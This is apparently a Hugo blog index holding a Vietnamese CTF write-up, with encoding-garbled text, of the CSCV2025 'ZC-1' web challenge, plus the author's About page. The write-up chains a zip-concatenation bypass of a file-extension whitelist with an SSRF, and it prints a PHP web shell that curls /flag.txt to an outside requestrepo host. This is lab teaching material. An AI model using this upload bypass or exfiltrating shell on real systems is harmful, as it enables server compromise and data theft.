[{"content":"âš”ï¸ ZC-1 Category: Web Difficulty: _ Author: _ Description: _ Resource: _ ğŸ›°ï¸Recon Tá»•ng quan chung: Challenge bao gá»“m 2 á»©ng dá»¥ng web vá»›i:\napp1 lÃ  á»©ng dá»¥ng web Python cho phÃ©p Ä‘Äƒng kÃ­, Ä‘Äƒng nháº­p, vÃ  upload file zip, á»©ng dá»¥ng Ä‘Æ°á»£c expose vá»›i port 8080 app2 lÃ  á»©ng dá»¥ng web Php phá»¥c vá»¥ cho viá»‡c giáº£i nÃ©n lÃ  lÆ°u trá»¯ cÃ¡c file vá»«a upload, á»©ng dá»¥ng khÃ´ng thá»ƒ truy cáº­p tá»« bÃªn ngoÃ i mÃ  chá»‰ cÃ³ thá»ƒ thÃ´ng qua app1 hoáº·c tá»« bÃªn trong Chi tiáº¿t App1 á»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau (bá» qua má»™t sá»‘ chi tiáº¿t khÃ´ng quan trá»ng):\nPOST /gateway/user : cho phÃ©p ngÆ°á»i Ä‘Äƒng kÃ­ vá»›i cÃ¡c trÆ°á»ng username, password POST /gateway/transport : cho phÃ©p ngÆ°á»i dÃ¹ng Ä‘Ã£ xÃ¡c thá»±c upload file zip Endpoint nÃ y sá»­ dá»¥ng thÆ° viá»‡n zipfile trong python Ä‘á»ƒ thá»±c hiá»‡n kiá»ƒm tra file extension cá»§a cÃ¡c file entry trong file zip Ä‘Æ°á»£c upload dá»±a trÃªn whilelist trÆ°á»›c khi gá»­i nÃ³ Ä‘áº¿n endpoint upload.php cá»§a app2 GET /gateway/health : nháº­n vÃ o param module cho phÃ©p ngÆ°á»i dÃ¹ng kiá»ƒm tra hoáº¡t Ä‘á»™ng cá»§a cÃ¡c endpoint táº¡i app2 POST auth/token : thá»±c hiá»‡n xÃ¡c thá»±c ngÆ°á»i dÃ¹ng vá»›i username vÃ  password, tráº£ vá»ƒ session token (sá»­ dá»¥ng cho viá»‡c xÃ¡c thá»±c) vÃ  refresh token App2 á»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau\nPOST upload.php: cho phÃ©p upload file zip (tá»« app1) vÃ  thá»±c hiá»‡n giáº£i nÃ©n file zip vÃ  lÆ°u cÃ¡c file sau khi Ä‘Ã£ giáº£i nÃ©n trong folder upload/\u0026lt;user_id\u0026gt; health.php: má»™t file rá»—ng chá»‰ nháº±m má»¥c Ä‘Ã­ch kiá»ƒm tra káº¿t ná»‘i, hoáº¡t Ä‘á»™ng cá»§a app2 ğŸ§ª Dig \u0026amp; Analyze Dá»±a trÃªn cáº¥u trÃºc cá»§a challenge, há»‡ thá»‘ng cho phÃ©p upload file zip sau Ä‘Ã³ thá»±c hiá»‡n giáº£i nÃ©n vÃ  lÆ°u trá»¯ cÃ¡c file entry trong á»©ng dá»¥ng web Php (thÆ° má»¥c lÆ°u trá»¯ file khÃ´ng cÃ³ cáº¥u hÃ¬nh Ä‘á»ƒ ngÄƒn viá»‡c thá»±c thi file .php). Váº­y má»¥c tiÃªu challenge á»Ÿ Ä‘Ã¢y kháº£ nÄƒng cao lÃ  upload web shell thÃ´ng qua viá»‡c upload file zip chá»©a file entry nguy hiá»ƒm.\nDá»±a trÃªn má»¥c tiÃªu trÃªn, cÃ³ 2 váº¥n Ä‘á» cáº§n giáº£i quyáº¿t:\n1. LÃ m tháº¿ nÃ o Ä‘á»ƒ bypass Ä‘Æ°á»£c file extension check á»Ÿ app1 -\u0026gt; Zip Concatenation Trong khi app1 thá»±c hiá»‡n kiá»ƒm tra file zip upload vá»›i thÆ° viá»‡n zipfile thÃ¬ app2 láº¡i sá»­ dá»¥ng Archive7z\\Archive7z hay cÃ´ng cá»¥ 7z Ä‘á»ƒ thá»±c hiá»‡n giáº£i nÃ©n file zip.\nBáº¡n cÃ³ thá»ƒ chá»§ Ä‘á»™ng tÃ¬m hiá»ƒu thÃªm vá» cáº¥u trÃºc file zip Ä‘á»ƒ hiá»ƒu rÃµ hÆ¡n bÃ i wriuteup, bÃ i wriueup khÃ´ng Ä‘i sÃ¢u vÃ o phÃ¢n tÃ­ch cáº¥u trÃºc file zip hay giáº£i thÃ­ch cá»¥ thá»ƒ vá» lá»— há»•ng zip concatenation\nÄi vÃ o chi tiáº¿t hÆ¡n cÃ¡ch mÃ  2 trÃ¬nh zip parser nÃ y hoáº¡t Ä‘á»™ng:\nÄá»‘i vá»›i python zipfile, trÃ¬nh Ä‘á»c zip nÃ y khÃ´ng báº¯t Ä‘áº§u Ä‘á»c tá»« Ä‘áº§u tá»‡p mÃ  thay vÃ o Ä‘Ã³, nÃ³ quÃ©t ngÆ°á»£c tá»« cuá»‘i file Ä‘á»ƒ tÃ¬m kiáº¿m láº§n lÆ°á»£t End of Central Directory, Central Directory, file entry dá»±a trÃªn offset. Äá»‘i vá»›i 7z, Ä‘á»‹nh dáº¡ng nÃ y Ä‘áº·t signature vÃ  cÃ¡c header cá»§a nÃ³ á»Ÿ Ä‘áº§u tá»‡p. CÃ´ng cá»¥ 7z báº¯t Ä‘áº§u phÃ¢n tÃ­ch file zip tá»« Ä‘áº§u tá»‡p (offset = 0) -\u0026gt; Äiá»ƒm khÃ´ng Ä‘á»“ng nháº¥t á»Ÿ Ä‘Ã¢y cÃ¹ng vá»›i hÃ¬nh áº£nh mÃ´ táº£ cá»§a challenge gá»£i cho tÃ´i Ã½ tÆ°á»Ÿng vá» viá»‡c táº­n dá»¥ng Ä‘iá»ƒm khÃ¡c biá»‡t cá»§a 2 trÃ¬nh zip parser Ä‘á»ƒ táº¡o má»™t file zip há»£p lá»‡ vá»›i cáº£ 2 trÃ¬nh parser tuy nhiÃªn ná»™i dung Ä‘á»c Ä‘Æ°á»£c cá»§a chÃºng láº¡i khÃ¡c nhau bá»Ÿi cÆ¡ cháº¿ phÃ¢n tÃ­ch cá»§a chÃºng khÃ¡c nhau.\nTÃ¬m hiá»ƒu thÃªm má»™t vÃ i kÄ© thuáº­t táº¥n cÃ´ng liÃªn quan Ä‘áº¿n Ä‘á»‹nh dáº¡ng file Zip tÃ´i tÃ¬m Ä‘Æ°á»£c kÄ© thuáº­t Zip Concatenation phÃ¹ há»£p vá»›i tÃ¬nh huá»‘ng lá»— há»•ng nÃ y\n2. LÃ m tháº¿ nÃ o Ä‘á»ƒ cÃ³ thá»ƒ thá»±c thi file php náº¿u Ä‘Ã£ upload Ä‘Æ°á»£c thÃ nh cÃ´ng -\u0026gt; SSRF á»¨ng dá»¥ng app1 cho phÃ©p kiá»ƒm tra hoáº¡t Ä‘á»™ng cá»§a backend táº¡i endpoint GET /gateway/health. Endpoint nÃ y nháº­n vÃ o params module, input nÃ y Ä‘Æ°á»£c ná»‘i chuá»—i vÃ o storage_url mÃ  khÃ´ng qua kiá»ƒm tra sÃ ng lá»c dáº«n Ä‘áº¿n cÃ³ thá»ƒ khai thÃ¡c SSRF á»Ÿ Ä‘Ã¢y Ä‘á»ƒ gá»i Ä‘áº¿n file php Ä‘Æ°á»£c upload -\u0026gt; Thá»±c thi thÃ nh cÃ´ng file .php ğŸ”¥ Exploit Táº¡o payload Táº¡o file zip an toÃ n chá»©a cÃ¡c file entry phÃ¹ há»£p vá»›i whitelist cá»§a challenge echo helloworld \u0026gt; user.txt zip user.zip user.txt \u0026gt;/dev/null Táº¡o 7z archive chá»©a web shell echo \u0026#39;\u0026lt;?php system(\u0026#34;curl https://w4zhdt6e.requestrepo.com/ -F \\\u0026#34;file=@/flag.txt\\\u0026#34;\u0026#34;) ?\u0026gt;\u0026#39; \u0026gt; shell.php 7z a -t7z evil.7z shell.php \u0026gt;/dev/null File nÃ y cÃ³ kÃ­ch thÆ°á»›c lÃ  207 bytes (0xCF bytes)\nChá»‰nh sá»­a payload sao cho há»£p lá»‡ vá»›i zipfile ChÃºng ta sáº½ thá»±c hiá»‡n ná»‘i 2 file Ä‘Æ¡n giáº£n báº±ng viá»‡c sá»­ dá»¥ng lá»‡nh cat\ncat evil.zip user.zip \u0026gt; zipconcat.zip Tuy nhiÃªn file zip nÃ y chÆ°a há»£p lá»‡ bá»Ÿi viá»‡c thÃªm trÆ°á»›c file zip má»™t file 7z sáº½ khiáº¿n offset cá»§a pháº§n user.zip bá»‹ thay Ä‘á»•i, do Ä‘Ã³ cáº§n thá»±c hiá»‡n chá»‰nh sá»­a offset sao cho payload nÃ y há»£p lá»‡ vá»›i zipfile\nCÃ¡c 2 vá»‹ trÃ­ offset cáº§n thay Ä‘á»•i (9D bá»Ÿi thÃªm vÃ o trÆ°á»›c file nÃ y 0x9D bytes) lÃ :\noffset tá»›i Central Directory: náº±m trong pháº§n End of Centrol directory cÃ³ giÃ¡ trá»‹ lÃ  4D chá»‰nh sá»­a thÃ nh 11C = 4D + CF offset tá»›i Local file Header náº±m táº¡i offset 42 tÃ¬nh tá»« Ä‘áº§u má»—i Central Directory cÃ³ giÃ¡ trá»‹ lÃ  00 chá»‰nh sá»­a thÃ nh CF = 00 + CF Trá»±c tiáº¿p thay Ä‘á»•i offset báº±ng viá»‡c sá»­ dá»¥ng hex editor\ncat evil.7z user.zip \u0026gt; zipconcat.zip Kiá»ƒm tra file vá»›i python zipfile Kiá»ƒm tra file zip vá»›i 7z VÃ¬ táº­p lá»‡nh Ä‘áº·t tá»‡p lÆ°u trá»¯ 7z á»Ÿ ngay Ä‘áº§u tá»‡p Ä‘Æ°á»£c káº¿t há»£p, nÃªn cÃ¡c cÃ´ng cá»¥ 7z sáº½ coi tá»‡p Ä‘Æ°á»£c káº¿t há»£p nhÆ° má»™t tá»‡p lÆ°u trá»¯ 7z bÃ¬nh thÆ°á»ng vÃ  trÃ­ch xuáº¥t ná»™i dung 7z (tá»‡p PHP trong vÃ­ dá»¥ cá»§a báº¡n) mÃ  khÃ´ng cáº§n Ä‘á»™ng Ä‘áº¿n cÃ¡c cáº¥u trÃºc ZIP Ä‘Æ°á»£c thÃªm vÃ o phÃ­a dÆ°á»›i Máº·c dÃ¹ cÃ³ thÃ´ng bÃ¡o lá»—i bá»Ÿi 7z phÃ¡t hiá»‡n cÃ²n cÃ¡c bytes á»Ÿ cuá»‘i file nhÆ°ng payload váº«n Ä‘Æ°á»£c giáº£i nÃ©n thÃ nh cÃ´ng Thá»±c hiá»‡n táº¥n cÃ´ng Táº¡o tÃ i khoÃ n ngÆ°á»i dÃ¹ng vÃ  láº¥y Authorization token (JWT):\nThá»±c hiá»‡n upload file payload vá»«a táº¡o vá»›i Authorization header chá»©a token vá»«a láº¥y Ä‘Æ°á»£c\nThá»±c hiá»‡n SSRF thá»ƒ thá»±c thi file php Ä‘Ã£ upload, tuy nhiÃªn cáº§n xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c vá»‹ trÃ­ cá»§a file trÃªn server\nFile sau khi extract Ä‘Æ°á»£c lÆ°u táº¡i thÆ° má»¥c upload/\u0026lt;user_id\u0026gt;, chÃºng ta cÃ³ thá»ƒ dá»… dÃ ng tÃ¬m Ä‘Æ°á»£c user id trong JWT token\nThá»±c hiá»‡n SSRF\nMáº·c dÃ¹ request tráº£ vá» \u0026ldquo;ERR\u0026rdquo; nhÆ°ng chÃºng ta váº«n thÃ nh cÃ´ng láº¥y Ä‘Æ°á»£c flag\nğŸ† EXP -\u0026gt; Zip Concatenation\n","permalink":"https://HaiNhat-HUST.github.io/ctf/cscv_2025/zc-1/","summary":"\u003ch1 id=\"-zc-1\"\u003eâš”ï¸ ZC-1\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCategory:\u003c/strong\u003e Web\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDifficulty:\u003c/strong\u003e _\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAuthor:\u003c/strong\u003e _\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDescription\u003c/strong\u003e: _\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eResource\u003c/strong\u003e: _\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"image\" loading=\"lazy\" src=\"https://hackmd.io/_uploads/S1omJ7XAex.png\"\u003e\u003c/p\u003e\n\u003ch1 id=\"recon\"\u003eğŸ›°ï¸Recon\u003c/h1\u003e\n\u003ch2 id=\"tá»•ng-quan-chung\"\u003eTá»•ng quan chung:\u003c/h2\u003e\n\u003cp\u003eChallenge bao gá»“m 2 á»©ng dá»¥ng web vá»›i:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eapp1 lÃ  á»©ng dá»¥ng web Python cho phÃ©p Ä‘Äƒng kÃ­, Ä‘Äƒng nháº­p, vÃ  upload file zip, á»©ng dá»¥ng Ä‘Æ°á»£c expose vá»›i port 8080\u003c/li\u003e\n\u003cli\u003eapp2 lÃ  á»©ng dá»¥ng web Php phá»¥c vá»¥ cho viá»‡c giáº£i nÃ©n lÃ  lÆ°u trá»¯ cÃ¡c file vá»«a upload, á»©ng dá»¥ng khÃ´ng thá»ƒ truy cáº­p tá»« bÃªn ngoÃ i mÃ  chá»‰ cÃ³ thá»ƒ thÃ´ng qua app1 hoáº·c tá»« bÃªn trong\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"chi-tiáº¿t\"\u003eChi tiáº¿t\u003c/h2\u003e\n\u003ch3 id=\"app1\"\u003eApp1\u003c/h3\u003e\n\u003cp\u003eá»¨ng dá»¥ng bao gá»“m cÃ¡c endpoint sau (bá» qua má»™t sá»‘ chi tiáº¿t khÃ´ng quan trá»ng):\u003c/p\u003e","title":"CSCV2025 | Web | ZC-1"},{"content":" TÃªn: Le Hai Nhat Chá»©c danh: Student / Pentester / (Redteamer) Vá»‹ trÃ­: Viá»‡t Nam TÃ³m táº¯t ngáº¯n MÃ¬nh lÃ  Nhat\nKá»¹ nÄƒng NgÃ´n ngá»¯ láº­p trÃ¬nh: Python, C, JavaScript (React, Node.js), Kotlin (Android). Web \u0026amp; DevOps: HTML, CSS, Hugo, Docker, Nginx. Báº£o máº­t / CTF: Web (SSTI, XXE, SQLi, HTTP Smuggling) CÃ´ng cá»¥: Burp Suite, Nmap, ffuf, Metasploit, Wireshark. Kinh nghiá»‡m \u0026amp; Há»c táº­p Äang há»c/quan tÃ¢m: Web security, pentesting lab. Tham gia CTF, viáº¿t writeup cho cÃ¡c challenge vá» Web vÃ  Pwn. Dá»± Ã¡n tiÃªu biá»ƒu LiÃªn há»‡ Email: hainhat5423@gmail.com GitHub: github.com/HaiNhat-HUST Twitter/X: _ ","permalink":"https://HaiNhat-HUST.github.io/about/","summary":"\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eTÃªn\u003c/strong\u003e: Le Hai Nhat\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eChá»©c danh\u003c/strong\u003e: Student / Pentester / (Redteamer)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVá»‹ trÃ­\u003c/strong\u003e: Viá»‡t Nam\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"tÃ³m-táº¯t-ngáº¯n\"\u003eTÃ³m táº¯t ngáº¯n\u003c/h2\u003e\n\u003cp\u003eMÃ¬nh lÃ  Nhat\u003c/p\u003e\n\u003ch2 id=\"ká»¹-nÄƒng\"\u003eKá»¹ nÄƒng\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eNgÃ´n ngá»¯ láº­p trÃ¬nh:\u003c/strong\u003e Python, C, JavaScript (React, Node.js), Kotlin (Android).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWeb \u0026amp; DevOps:\u003c/strong\u003e HTML, CSS, Hugo, Docker, Nginx.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBáº£o máº­t / CTF:\u003c/strong\u003e Web (SSTI, XXE, SQLi, HTTP Smuggling)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCÃ´ng cá»¥:\u003c/strong\u003e Burp Suite, Nmap, ffuf, Metasploit, Wireshark.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"kinh-nghiá»‡m--há»c-táº­p\"\u003eKinh nghiá»‡m \u0026amp; Há»c táº­p\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eÄang há»c/quan tÃ¢m: Web security, pentesting lab.\u003c/li\u003e\n\u003cli\u003eTham gia CTF, viáº¿t writeup cho cÃ¡c challenge vá» Web vÃ  Pwn.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"dá»±-Ã¡n-tiÃªu-biá»ƒu\"\u003eDá»± Ã¡n tiÃªu biá»ƒu\u003c/h2\u003e\n\u003ch2 id=\"liÃªn-há»‡\"\u003eLiÃªn há»‡\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eEmail: \u003ca href=\"mailto:hainhat5423@gmail.com\"\u003ehainhat5423@gmail.com\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eGitHub: github.com/HaiNhat-HUST\u003c/li\u003e\n\u003cli\u003eTwitter/X: _\u003c/li\u003e\n\u003c/ul\u003e","title":"About"}]